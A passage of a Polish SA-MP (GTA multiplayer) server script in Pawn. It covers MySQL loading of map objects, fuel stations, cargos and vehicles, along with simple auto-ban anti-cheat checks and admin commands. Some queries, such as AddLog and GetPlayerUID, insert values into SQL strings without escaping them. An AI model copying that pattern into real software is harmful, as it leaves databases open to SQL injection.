		Create3DTextLabel("Aby otworzyc granice wpisz "BIALYHEX"/lv", Zielony, 1720.2373,451.1036,30.8009, 20.0, 0, 0);
		Create3DTextLabel("Aby otworzyc granice wpisz "BIALYHEX"/ls", Zielony, 1719.4833,490.6562,29.7451, 20.0, 0, 0);

		return printf("[LOGS] Zaladowano pomyslnie %d domow!",i);
	}


	stock LoadTrashes()
	{
		new Query[400], i=0;
		new labelstring[150];
		format(Query, sizeof(Query), "SELECT `x`,`y`,`z` FROM `trashes`");
		mysql_query(Query);
		mysql_store_result();
		LoadedInfo[Trashes] = 0;
		while(mysql_fetch_row(Query,"|"))
		{
			if(mysql_num_rows() != 0)
			{
				i++;

				LoadedInfo[Trashes]++;
				sscanf(Query, "p<|>fff",TrashInfo[i][trashX],TrashInfo[i][trashY],TrashInfo[i][trashZ]);
				format(labelstring,sizeof labelstring,"Kosz: "BIALYHEX"%d",i);
				trash3Dtext[i] = CreateDynamic3DTextLabel(labelstring, 0x009e05FF,TrashInfo[i][trashX],TrashInfo[i][trashY],TrashInfo[i][trashZ]-TRASH_MINUS, 30.0);
				CreateObject(TRASH_OBJECT, TrashInfo[i][trashX],TrashInfo[i][trashY],TrashInfo[i][trashZ]-TRASH_MINUS, 0.0,0.0,0.0);
			}

		}
		mysql_free_result();



		return printf("[LOGS] Zaladowano pomyslnie %d koszy dla zuli! VERSION: 1.0 >> KapiziaK",i);
	}


	stock LoadLoading()
	{
		new Query[400], i=0;
		new labelstring[150];
		format(Query, sizeof(Query), "SELECT `name`, `x`, `y`,`z` FROM `loading`");
		mysql_query(Query);
		mysql_store_result();
		LoadedInfo[Magazines] = 0;
		while(mysql_fetch_row(Query,"|"))
		{
			if(mysql_num_rows() != 0)
			{
				i++;

				LoadedInfo[Magazines]++;
				sscanf(Query, "p<|>s[50]fff",MagazineInfo[i][Name],MagazineInfo[i][x],MagazineInfo[i][y],MagazineInfo[i][z]);
				format(labelstring,sizeof labelstring,""NIEBIESKIHEX"Zaladunek "BIALYHEX"%s\n "NIEBIESKIHEX"Aby sie zaladowac wpisz "BIALYHEX"/zaladuj"ZIELONYHEX"!",MagazineInfo[i][Name]);
				CreateDynamic3DTextLabel(labelstring, 0x009e05FF,MagazineInfo[i][x],MagazineInfo[i][y],MagazineInfo[i][z], 50.0);


				for(new p=0; p < GetMaxPlayers(); p++)
				{
					SetPlayerMapIcon(p, p, MagazineInfo[i][x],MagazineInfo[i][y],MagazineInfo[i][z], 51, 0, MAPICON_LOCAL );
				}

			}

		}
		mysql_free_result();



		return printf("[LOGS] Zaladowano pomyslnie %d zaladunkow!",i);
	}

	stock LoadStacje()
	{
		new Query[400], i=0;
		new labelstring[150];
		format(Query, sizeof(Query), "SELECT `name`, `x`, `y`,`z`,`cost` FROM `fuelstations`");
		mysql_query(Query);
		mysql_store_result();
		LoadedInfo[Stacji] = 0;
		while(mysql_fetch_row(Query,"|"))
		{
			if(mysql_num_rows() != 0)
			{
				i++;

				LoadedInfo[Stacji]++;
				sscanf(Query, "p<|>s[100]fffd",StacjaInfo[i][Name],StacjaInfo[i][xb],StacjaInfo[i][yb],StacjaInfo[i][zb],StacjaInfo[i][MoneyLitr]);
				format(labelstring,sizeof labelstring,"Stacja Benzynowa: "BIALYHEX" %s\n"HEXNIEBIESKI"Cena za litr: "BIALYHEX"$%d\n"HEXNIEBIESKI"Wpisz /tankuj aby zatankowac woz!",StacjaInfo[i][Name],StacjaInfo[i][MoneyLitr]);
				CreateDynamic3DTextLabel(labelstring, Niebieski,StacjaInfo[i][xb],StacjaInfo[i][yb],StacjaInfo[i][zb], 100.0);
				CreatePickup(1686, 1,StacjaInfo[i][xb],StacjaInfo[i][yb],StacjaInfo[i][zb] , -1);


			}

		}
		mysql_free_result();

		return printf("[LOGS] Zaladowano pomyslnie %d stacji benzynowych!",i);
	}

	stock AddLog(nick[],value[])
	{
		new query[200];
		format(query,sizeof query,"INSERT INTO `logs` (`nick`,`value`) VALUES ('%s','%s')",nick,value);
		mysql_query(query);
		return printf("[LOGS] %s - %s",nick,value);
	}


	stock BrakAdmina(playerid,level)
	{
		new string[150];
		format(string,sizeof string,"# Brak "BIALYHEX"%d levelu admina "CZERWONYHEX"do tej komendy!",level);

		return SendClientMessage(playerid,Czerwony,string);
	}
	stock CargoLoad()
	{
		new Query[400], i=0;
		format(Query, sizeof(Query), "SELECT `id`, `name`, `minlegal`, `minnielegal`,`Legal`,`NoLegal`, `vip`, `score`, `money`,`naczepka` FROM `cargos`");
		mysql_query(Query);
		mysql_store_result();
		while(mysql_fetch_row(Query,"|"))
		{
			if(mysql_num_rows() != 0)
			{
				i++;
				CargoLoaded++;
				sscanf(Query, "p<|>ds[100]dddddddd",cInfo[i][idt],cInfo[i][namet],cInfo[i][lg],cInfo[i][nlg],cInfo[i][legalt],cInfo[i][nolegalt],cInfo[i][vipw],cInfo[i][scorew],cInfo[i][moneyw],cInfo[i][naczepkat]);
			}
		}
		mysql_free_result();

		return printf("[CARGOS] Zaladowano pomyslnie %i towarow!",i);
	}

	stock LoadOrders()
	{
		new Query[400], i=0;
		format(Query, sizeof(Query), "SELECT `trailer`, `cargo`, `kilometers` FROM `orders` WHERE `status` = '0'");
		mysql_query(Query);
		mysql_store_result();
		while(mysql_fetch_row(Query,"|"))
		{
			if(mysql_num_rows() != 0)
			{
				i++;
				new t = 0,cid = 0,Float:kct = 0.00;
				sscanf(Query, "p<|>ddf",t,cid,kct);
				VehicleInfo[t][Towar] = cid;
				VehicleInfo[t][KM] = kct;
				VehicleInfo[t][ToOrder] = 2;
			}
		}
		mysql_free_result();

		return printf("[ORDERS] Zaladowano pomyslnie %i zlecen! Aktualnych przewozacych graczy!",i);
	}

	// `vehicle`, `cargo`, `kilometers`

	stock CargoUID(namecargo[])
	{
		new uidcargo = 0;
		for(new c=0; c <= CargoLoaded; c++)
		{
			if(!strcmp(namecargo,cInfo[c][namet],false))
			{
				printf("[CargoUID] Znalazlem fraze %s , podoby towar uid %d %s",namecargo,c,cInfo[c][namet]);
				uidcargo = cInfo[c][idt];
			}
		}
		return uidcargo;
	}


	/*
	stock LoadSigns()
	{
		new id=0;
		while(LoadedInfo[Vehicles])
		{
			id++;
			if(!strcmp(VehicleInfo[id][Owner],"Brak",false) && VehicleInfo[id][TeamCar] >= 1)
			{
				//SetVehicleNumberPlate(id, GetTeamName(VehicleInfo[id][TeamCar]));
			}
		}

		return printf("[AUTOMAT] Rejestracje do pojazdow wczytane!");
	}
	*/

	stock SendClientMessageToTeam(playerid,color,teamid,messange[])
	{
		new wynik[100];
		format(wynik,sizeof wynik,"# Blad: "BIALYHEX"Nikogo nie ma z tej frakcji/firmy!");
		for(new i=0; i < GetMaxPlayers(); i++)
		{
			if(IsPlayerConnected(i) && PlayerInfo[i][Team] == teamid)
			{
				SendClientMessage(i,color,messange);
				format(wynik,sizeof wynik,"# Wiadomosc zostala wyslana!");
			}
		}

		return SendClientMessage(playerid,Zielony,wynik);
	}


	stock LoadVehicles() // You might want to make this an public so you could call it on an timer.
	{
		new Query[800], id,i=0;
		format(Query, sizeof(Query), "SELECT `id`,`owner`,`model`,`price`,`x`,`y`,`z`,`a`,`sell`,`team`,`color1`,`color2`,`Paliwo`,`Przebieg`,`Olej`,`Rynkowa` FROM `vehicles`");
		mysql_query(Query);
		mysql_store_result();
		new num = mysql_num_rows();
		while(mysql_fetch_row(Query,"|"))
		{
			if(num != 0)
			{
				LoadedInfo[Vehicles]++;
				id = LoadedInfo[Vehicles];
				new idcheck;
				sscanf(Query, "p<|>ds[25]ddffffdddddfdd",idcheck,VehicleInfo[id][Owner],VehicleInfo[id][Model],VehicleInfo[id][Price],VehicleInfo[id][Pos][xa],VehicleInfo[id][Pos][ya],VehicleInfo[id][Pos][za],VehicleInfo[id][Pos][aa],VehicleInfo[id][sell],VehicleInfo[id][TeamCar],VehicleInfo[id][Color1],VehicleInfo[id][Color2],VehicleInfo[id][Paliwo],VehicleInfo[id][Przebieg],VehicleInfo[id][Olej],VehicleInfo[id][Rynkowa]);
				new Co1 = VehicleInfo[id][Color1];
				new Co2 = VehicleInfo[id][Color2];

				new idcreate;
				idcreate = AddStaticVehicleEx(VehicleInfo[id][Model],VehicleInfo[id][Pos][xa],VehicleInfo[id][Pos][ya],VehicleInfo[id][Pos][za],VehicleInfo[id][Pos][aa],Co1,Co2, 60*10000);
				VehicleInfo[idcreate][UID] = idcheck;
				VehicleInfo[idcreate][idDLL] = idcreate;
				new vehicleid = idcreate;
				if(GetVehicleModel(vehicleid) == 578)
				{

					objveh[vehicleid][0] = CreateObject(983, 0, 0, 0, 0, 0, 0);
					objveh[vehicleid][1] = CreateObject(983, 0, 0, 0, 0, 0, 0);
					objveh[vehicleid][2] = CreateObject(983, 0, 0, 0, 0, 0, 0);
					objveh[vehicleid][3] = CreateObject(983, 0, 0, 0, 0, 0, 0);
					objveh[vehicleid][4] = CreateObject(11474, 0, 0, 0, 0, 0, 0); 
					AttachObjectToVehicle(objveh[vehicleid][0], vehicleid, 1.4550000429153, -0.85600000619888, 0.41100001335144, 0, 0, 0);
					AttachObjectToVehicle(objveh[vehicleid][1], vehicleid, 1.4490000009537, -2.4389998912811, 0.41100001335144, 0, 0, 0);
					AttachObjectToVehicle(objveh[vehicleid][2], vehicleid, -1.460000038147, -0.86400002241135, 0.41100001335144, 0, 0, 0);
					AttachObjectToVehicle(objveh[vehicleid][3], vehicleid, -1.4609999656677, -2.4519999027252, 0.41100001335144, 0, 0, 0);
					AttachObjectToVehicle(objveh[vehicleid][4], vehicleid, -0.068000003695488, -5.7540001869202, 0.38100001215935, 0, 2.5, 5.5);
					opendoor[vehicleid] = false;
				}

				/*if(VehicleInfo[id][sell] == 1)
				{
				new string[150];
				format(string,sizeof string,"Pojazd jest na sprzedaz:\n{FFFFFF}$%d",VehicleInfo[id][Price]);
				sell3d[idcreate] = Create3DTextLabel(string, 0x00CC00FF, 0.0,0.0,0.0, 100.0, 0);
				Attach3DTextLabelToVehicle(sell3d[idcreate], idcreate, 0.0, 0.0, 0.0);
				}*/


				//format(Query, sizeof(Query), "SELECT `id` FROM `vehicles` WHERE id='%d'",idcheck);
				//mysql_query(Query);
				//mysql_store_result();
				//mysql_fetch_row(Query,"|");
				//sscanf(Query, "p<|>d",VehicleInfo[idcreate][UID]);
				//mysql_free_result();
				/*new vehicleid = idcreate;
				if(VehicleInfo[id][Model] == 578) // If it's a DFT-30
				{
				    objveh[vehicleid][0] = CreateObject(983, 0, 0, 0, 0, 0, 0);
					objveh[vehicleid][1] = CreateObject(983, 0, 0, 0, 0, 0, 0);
					objveh[vehicleid][2] = CreateObject(983, 0, 0, 0, 0, 0, 0);
					objveh[vehicleid][3] = CreateObject(983, 0, 0, 0, 0, 0, 0);
					objveh[vehicleid][4] = CreateObject(11474, 0, 0, 0, 0, 0, 0); 
					AttachObjectToVehicle(objveh[vehicleid][0], vehicleid, 1.4550000429153, -0.85600000619888, 0.41100001335144, 0, 0, 0);
					AttachObjectToVehicle(objveh[vehicleid][1], vehicleid, 1.4490000009537, -2.4389998912811, 0.41100001335144, 0, 0, 0);
					AttachObjectToVehicle(objveh[vehicleid][2], vehicleid, -1.460000038147, -0.86400002241135, 0.41100001335144, 0, 0, 0);
					AttachObjectToVehicle(objveh[vehicleid][3], vehicleid, -1.4609999656677, -2.4519999027252, 0.41100001335144, 0, 0, 0);
					AttachObjectToVehicle(objveh[vehicleid][4], vehicleid, -0.068000003695488, -5.7540001869202, 0.38100001215935, 0, 2.5, 5.5);
					opendoor[vehicleid] = false;
				}*/


				if(strcmp(VehicleInfo[id][Owner],"Brak",false))
				{
					SetVehicleNumberPlate(idcreate, VehicleInfo[id][Owner]);
				}
				else if(!strcmp(VehicleInfo[id][Owner],"Brak",false) && VehicleInfo[id][TeamCar] == 0)
				{
					SetVehicleNumberPlate(idcreate, "Publiczny");
				}

			}

			i++;
		}
		mysql_free_result();


		return printf("[AUTOMAT] Wczytano %d pojazdow!!!",i);
	}

	forward respawn();
	public respawn()
	{
		new bool:Using[MAX_VEHICLES]=false,vid;
		for(new i = GetMaxPlayers() - 1; i >= 0; i--)
		{
			if(IsPlayerInAnyVehicle(i))
			{
				vid=GetPlayerVehicleID(i);
				Using[vid]=true;
				if(IsTrailerAttachedToVehicle(vid))
				{
					Using[GetVehicleTrailer(vid)]=true;
				}
			}
		}
		for(new nr = 1; nr < MAX_VEHICLES; nr++)
		{
			if(Using[nr]==false)
			{
				SetVehicleToRespawn(nr);
			}
		}
		{
			new string[150]; //Wiadomosc
			format(string, sizeof(string), "# Wszystkie nieuzwane pojazdy zostaly zrespawnowane!");
			SendClientMessageToAll(Zielony, string);
		}

		return 1;
	}

	stock GetTeamName(team)
	{

		new query[150];
		new teamname[50];
		format(query,sizeof query,"SELECT `name` FROM `company` WHERE `id` = '%d'",team);
		mysql_query(query);
		mysql_store_result();

		new num = mysql_num_rows();
		if(num == 0)
		{
			format(teamname,sizeof teamname,"NieZnaleziono!");
		}
		else
		{
			mysql_fetch_row(query,"|");
			new name[50];
			sscanf(query,"p<|>s[50]",name);
			format(teamname,sizeof teamname,"%s",name);

		}

		mysql_free_result();

		return teamname;
	}


	stock GetPlayerUID(nick[])
	{

		new query[150];
		new usuid;
		format(query,sizeof query,"SELECT `id` FROM `users` WHERE `nick` = '%s'",nick);
		mysql_query(query);
		mysql_store_result();

		new num = mysql_num_rows();
		if(num != 0)
		{
			mysql_fetch_row(query,"|");
			//new name[50];
			sscanf(query,"p<|>d",usuid);
			//format(teamname,sizeof teamname,"%s",name);

		}

		mysql_free_result();

		return usuid;
	}


	stock BrakTeam(playerid,team)
	{
		new string[150];
		format(string,sizeof string,"# Do tej komendy musisz byc w "BIALYHEX" %s",GetTeamName(team));

		return SendClientMessage(playerid,Zielony,string);
	}

	stock Player_Vehicles_Num(playerid)
	{
		new num = 0;


		for(new i = 0; i < LoadedInfo[Vehicles]; i++)
		{
			if(!strcmp(VehicleInfo[i][Owner],PlayerName(playerid),false))
			{
				num++;
			}
		}


		return num;
	}


	stock AntySpeedHack(playerid)
	{
		new vehid = GetPlayerVehicleID(playerid);
		if(vehid != 0)
		{

			new Float:predx, Float:predy, Float:predz,predb;
			GetVehicleVelocity(vehid,predx,predy,predz);
			predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);

			if(predb >= 330)
			{
				BanExServer(playerid,"AntyCheat: Speed",7);
				BanAdd(playerid,"AntyCheat: Speed",playerid,7);
			}

		}



		return 1;
	}

	stock AntyWeapon(playerid)
	{
		new weapon = GetPlayerWeapon(playerid);
		if(weapon && weapon != 46 && weapon != 43 && PlayerInfo[playerid][LevelAdmin] != 5)
		{

			if(PlayerInfo[playerid][Team] == 1)
			{

				if(weapon != 3 && weapon != 31 && weapon != 25 && weapon != 28 && weapon != 24 && weapon != 1272)
				{
					BanExServer(playerid,"Anty Weapon in Police",7);
					BanAdd(playerid,"AntyCheat: Weapon in Police",playerid,7);
				}

			}
			else
			{

				if(weapon != 43 && weapon != 41 && weapon != 42)
				{
					BanExServer(playerid,"Anty Weapon",7);
					BanAdd(playerid,"AntyCheat: Weapon",playerid,7);
				}

			}

		}

		return 1;
	}


	stock AntyVehLocation(playerid)
	{
		new vehid = GetPlayerVehicleID(playerid);
		if(vehid != 0 && antycheatveh == true)
		{
			new Float:predx, Float:predy, Float:predz,predb;
			GetVehicleVelocity(vehid,predx,predy,predz);
			predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);
			//print("test2-");

			new Float:vehposX,Float:vehposY,Float:vehposZ;
			GetVehiclePos(vehid,vehposX,vehposY,vehposZ);
			//printf(">>>> %f %f %f << ",ACVehLocX[vehid],ACVehLocY[vehid],ACVehLocZ[vehid]);
			if(GetPVarInt(playerid,"antykola") != 1)
			{
			ACVehLocX[vehid] = vehposX;
			ACVehLocY[vehid] = vehposY;
			ACVehLocZ[vehid] = vehposZ;
			SetPVarInt(playerid,"antykola",1);
			SetPVarInt(playerid,"aveh",vehid);
			}
			else
			{
				SetPVarInt(playerid,"antykola",0);
				SetPVarInt(playerid,"aveh2",vehid);
			}

			if(predb == 0 && GetPVarInt(playerid,"teleportTimer") != 1)
			{
				//print("test3-------");


				//printf("-- %f %f %f",vehposX,vehposY,vehposZ);
				if(!IsPlayerInRangeOfPoint(playerid, 40.0, ACVehLocX[vehid],ACVehLocY[vehid],ACVehLocZ[vehid]) && GraczWpisalZW[playerid] != 1 && GetPVarInt(playerid,"aveh") == GetPVarInt(playerid,"aveh2"))
				{
					BanExServer(playerid,"Anty Vehicle Location",7);
					BanAdd(playerid,"AntyCheat: Vehicle Location ++",playerid,7);	
					//printf(">>>> %f %f %f << ",ACVehLocX[vehid],ACVehLocY[vehid],ACVehLocZ[vehid]);

					printf("[antycheat log] ban %s %d info %f %f %f",PlayerName(playerid),playerid,vehposX,vehposY,vehposZ);	
					//SendClientMessage(playerid, -1, "i co? Ban chuju xD");

				}


			}
		}

		return 1;
	}



	forward SendPasekInfo(playerid,type);
	public SendPasekInfo(playerid,type)
	{


		if(type == 1)
		{
			new fazainfo = GetPVarInt(playerid,"fazainfo");
			new fazy = fazainfo;
			new string[150];
			if(fazainfo == 0) 
			{
				format(string,sizeof string,"~y~Kontrola ~w~Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 1) 
			{
				format(string,sizeof string,"~w~Kontrola ~y~Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 2) 
			{
				format(string,sizeof string,"~w~Kontrola ~y~Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 3) 
			{
				format(string,sizeof string,"~w~K~y~ontrola Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 4) 
			{
				format(string,sizeof string,"~w~Ko~y~ntrola Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 5) 
			{
				format(string,sizeof string,"~w~Kon~y~trola Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 6) 
			{
				format(string,sizeof string,"~w~Kont~y~rola Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 7) 
			{
				format(string,sizeof string,"~w~Kontr~y~ola Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 8) 
			{
				format(string,sizeof string,"~w~Kontro~y~la Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 9) 
			{
				format(string,sizeof string,"~w~Kontrol~y~a Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 10) 
			{
				format(string,sizeof string,"~w~Kontrola ~y~Drogowa");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 11) 
			{
				format(string,sizeof string,"~w~Kontrola ~y~Drogowa");
				SetPVarInt(playerid,"fazainfo",0);
			}

			TextDrawSetString(pasekuserinfo[playerid],string);


		}

		if(type == 2) // pw
		{
			new fazainfo = GetPVarInt(playerid,"fazainfo");
			new fazy = fazainfo;
			new string[150];
			if(fazainfo == 0) 
			{
				format(string,sizeof string,"~y~Prywatna ~w~Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 1) 
			{
				format(string,sizeof string,"~w~Prywatna ~y~Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 2) 
			{
				format(string,sizeof string,"~w~Prywatna ~y~Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 3) 
			{
				format(string,sizeof string,"~y~P~w~rywatna Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 4) 
			{
				format(string,sizeof string,"~y~Pr~w~ywatna Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 5) 
			{
				format(string,sizeof string,"~y~Pry~w~watna Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 6) 
			{
				format(string,sizeof string,"~y~Pryw~w~atna Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 7) 
			{
				format(string,sizeof string,"~y~Prywa~w~tna Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 8) 
			{
				format(string,sizeof string,"~y~Prywat~w~na Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 9) 
			{
				format(string,sizeof string,"~y~Prywatn~w~a Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 10) 
			{
				format(string,sizeof string,"~y~Prywatna ~w~Wiadomosc");
				SetPVarInt(playerid,"fazainfo",fazy+1);
			}
			else if(fazainfo == 11) 
			{
				format(string,sizeof string,"~w~Prywatna ~y~Wiadomosc");
				SetPVarInt(playerid,"fazainfo",0);
			}

			TextDrawSetString(pasekuserinfo[playerid],string);


		}


		return 1;
	}

	forward InfoOff(playerid);
	public InfoOff(playerid)
	{

		KillTimer(timerPasekInfo[playerid]);
		TextDrawSetString(pasekuserinfo[playerid],"");
		SetPVarInt(playerid,"userinfo",0);
		return 1;
	}




	stock GetPlayerInMagazine(playerid)
	{
		new inmagazine = 0;
		for(new m=0; m < MAX_MAGAZINES; m++)
		{
			if(IsPlayerInRangeOfPoint(playerid,15.0,MagazineInfo[m][x],MagazineInfo[m][y],MagazineInfo[m][z]))
			{
				inmagazine = m;
			}
		}

		return inmagazine;
	}

	stock GetPlayerInStacja(playerid)
	{
		new instacja = 0;
		for(new s=0; s < MAX_STACJE; s++)
		{
			if(IsPlayerInRangeOfPoint(playerid,15.0,StacjaInfo[s][xb],StacjaInfo[s][yb],StacjaInfo[s][zb]))
			{
				instacja = 1;
			}
		}

		return instacja;
	}

	stock GetStacjaID(playerid)
	{
		new stacja = 0;
		for(new s=0; s < MAX_STACJE; s++)
		{
			if(IsPlayerInRangeOfPoint(playerid,15.0,StacjaInfo[s][xb],StacjaInfo[s][yb],StacjaInfo[s][zb]))
			{
				stacja = s;
			}
		}

		return stacja;
	}

	stock GetVehicleIDTrailer(playerid, vehid, modeltrailer)
	{
		new trailerid = 0;
		new model = GetVehicleModel(vehid);
		if(model == 403 || model == 482 || model == 413 || model == 609)
		{
			trailerid = vehid;
		}
		else
		{

			#pragma unused playerid
			if(IsTrailerAttachedToVehicle(vehid) && IsVehicleOccupied(vehid))
			{
				trailerid = modeltrailer;
			}

		}

		return trailerid;

	}

	stock IsVehicleOccupied(vehicleid)
	{
		for(new i =0; i < MAX_VEHICLES; i++)
		{
			if(IsPlayerInVehicle(i,vehicleid))
			{
				return 1;
			}
		}
		return 0;
	}

	stock SendClientMessageDistanse(playerid,color,textd[])
	{
		new Float:px,Float:py,Float:pz;
		GetPlayerPos(playerid,px,py,pz);
		for(new i=0; i < GetMaxPlayers(); i++)
		{

			if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,40.0,px,py,pz))
			{
				SendClientMessage(i,color,textd);
			}

		}


	}

	forward timerAntyCheatVeh(playerid);
	public timerAntyCheatVeh(playerid)
	{
		SetPVarInt(playerid,"teleportTimer",0);
		return 1;
	}


	CMD:admins(playerid,params[])
	{
		new adminstring[400];
		new string[100];
		for(new i; i < MAX_PLAYERS; i++)
		{

			if(IsPlayerConnected(i))
			{

				if(PlayerInfo[i][LevelAdmin] == 1)
				{
					format(string,sizeof string,""CZERWONYHEX"[Moderator]"BIALYHEX" %s[%d]\n",PlayerName(i),i);
					strcat(adminstring, string);
				}

				if(PlayerInfo[i][LevelAdmin] == 2)
				{
					format(string,sizeof string,""CZERWONYHEX"[Junior Admin]"BIALYHEX" %s[%d]\n",PlayerName(i),i);
					strcat(adminstring, string);
				}
				if(PlayerInfo[i][LevelAdmin] == 3)
				{
					format(string,sizeof string,""CZERWONYHEX"[Administrator]"BIALYHEX" %s[%d]\n",PlayerName(i),i);
					strcat(adminstring, string);
				}
				if(PlayerInfo[i][LevelAdmin] == 4)
				{
					format(string,sizeof string,""CZERWONYHEX"[Super Admin]"BIALYHEX" %s[%d]\n",PlayerName(i),i);
					strcat(adminstring, string);
				}
				if(PlayerInfo[i][LevelAdmin] == 5)
				{
					format(string,sizeof string,""CZERWONYHEX"[Vice Head Admin]"BIALYHEX" %s[%d]\n",PlayerName(i),i);
					strcat(adminstring, string);
				}
				if(PlayerInfo[i][LevelAdmin] == 6)
				{
					format(string,sizeof string,""CZERWONYHEX"[Head Admin]"BIALYHEX" %s[%d]\n",PlayerName(i),i);
					strcat(adminstring, string);
				}

			}

		}

		ShowPlayerDialog(playerid, 1574, DIALOG_STYLE_MSGBOX, "Administracja", adminstring, "Zamknij", "");

		return 1;

	}


	CMD:kick(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] == 0)
			return BrakAdmina(playerid,1);
		new id, powod[128];
		if(sscanf(params, "ds", id, powod))
			return SendClientMessage(playerid, Zielony, "# Uzyj: "BIALYHEX"/kick [id gracza] [powod]");


		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid, Szary, "Gracz o podanym id nie jest poloczony z serwerem");

		KickExServer(id,powod);
		printf("[ADMIN LOG] %s kicka %s powod: %s",PlayerName(playerid),PlayerName(id),powod);

		AddLog(PlayerName(playerid),"Zkickowal gracza");
		return 1;
	}




	CMD:ban(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] == 0)
			return BrakAdmina(playerid,1);
		new id, powod[128], dni;
		if(sscanf(params, "dds[128]", id, dni,powod))
			return SendClientMessage(playerid, Zielony, "# Uzyj: "BIALYHEX"/ban [id gracza] [dni 0-7] [powod]");


		if(dni < 0 || dni > 7)
		return SendClientMessage(playerid, Szary, "# Zakres dni banicji to 0-7!");


		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid, Szary, "Gracz o podanym id nie jest poloczony z serwerem");

		BanExServer(id,powod,dni);
		printf("[ADMIN LOG] %s banuje %s powod: %s",PlayerName(playerid),PlayerName(id),powod);
		BanAdd(id,powod,playerid,dni);
		AddLog(PlayerName(playerid),"Banuje Gracza");
		return 1;
	}

	CMD:pogoda(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] == 0)
			return BrakAdmina(playerid,1);
		new weather;
		if(sscanf(params, "d", weather))
			return SendClientMessage(playerid, JasnyCzerwony, "/pogoda [id pogody]");
		if(weather < 0 || weather > 500)
		{
			SendClientMessage(playerid, Szary, "Pogode mozna zmienic tylko od id 0 do id 500");
			return 1;
		}
		SetWeather(weather);
		SendClientMessage(playerid, Szary, "Pogoda zostala zmieniona pomyslnie");
		return 1;
	}
	CMD:zaladuj(playerid,params[])
	{
		new vehid = GetPlayerVehicleID(playerid);
		new modelt = GetVehicleTrailer(vehid);
		new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);

		if(GetPlayerInMagazine(playerid) == 0)
			return SendClientMessage(playerid, Czerwony, "# Nie jestes w zadnym magazynie!");

		if(VehicleInfo[dllt][Towar] >= 1)
			return SendClientMessage(playerid, Czerwony, "# Ten pojazd/naczepa ma juz towar!");

		if(PlayerInfo[playerid][Team] == COMPANY_PD || PlayerInfo[playerid][Team] == COMPANY_POLICJA || PlayerInfo[playerid][Team] == COMPANY_POGOTOWIE || PlayerInfo[playerid][Team] == COMPANY_TAXI || PlayerInfo[playerid][Team] == COMPANY_SITA || PlayerInfo[playerid][Team] == COMPANY_LINIA)
			return SendClientMessage(playerid, Czerwony, "# Jestes w frakcji!");

		if(vehid == 0)
			return SendClientMessage(playerid, Szary, "# Nie jestes w wozie!");

		new model = GetVehicleModel(vehid);

		if(model == 515 || model == 403 || model == 514 || model == 411)
		{
			if(!IsTrailerAttachedToVehicle(vehid))
				return SendClientMessage(playerid, Szary, "# Nie masz podczepionej naczepy!");

			//new string[150];
			//new cargoname[100];
			//if(sscanf(params,"s[100]",cargoname)) return SendClientMessage(playerid,Zielony,"# Uzyj: /zaladuj [NAZWA TOWARU] - lista towarow pod cmd /towary");

			//if(CargoUID(cargoname) != 0)



			if(BonusCargo == true)
			{
				ShowPlayerDialog(playerid, 690, DIALOG_STYLE_LIST, "Wybierz Towar", "Legalne\nNielegalne\nPremium\nPonadGabarytowe\nADR\nSpecjalne", "Wybierz","Anuluj");
			}
			else
			{
				ShowPlayerDialog(playerid, 690, DIALOG_STYLE_LIST, "Wybierz Towar", "Legalne\nNielegalne\nPremium\nPonadGabarytowe\nADR", "Wybierz","Anuluj");
			}



		}
		else
			return SendClientMessage(playerid, Zielony, "# Nie masz odpowiedniego wozu!");

		return 1;
	}
	stock LoadCargoToTrailer(playerid,idcargo)
	{
		//new string[180];
		new vehid = GetPlayerVehicleID(playerid);
		new modelt = GetVehicleTrailer(vehid);
		new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);
		new cargoname[100];
		if(idcargo != 0)
		{ // Sprawdza czy jest towar
			format(cargoname,sizeof cargoname,"%s",cInfo[idcargo][namet]);

			new bool:naczepkadoz;
			if(GetVehicleModel(dllt) == 611) naczepkadoz = true;
			else naczepkadoz = false;

			if(cInfo[idcargo][naczepkat] == false && naczepkadoz == false)
			{
				printf("[cargo debug] Gracz %s naczepka %d towar naczepka %d",PlayerName(playerid),cInfo[idcargo][naczepkat],naczepkadoz);
				LoadCargoToTrailer2(playerid,idcargo);
			}
			else if(cInfo[idcargo][naczepkat] == true)
			{
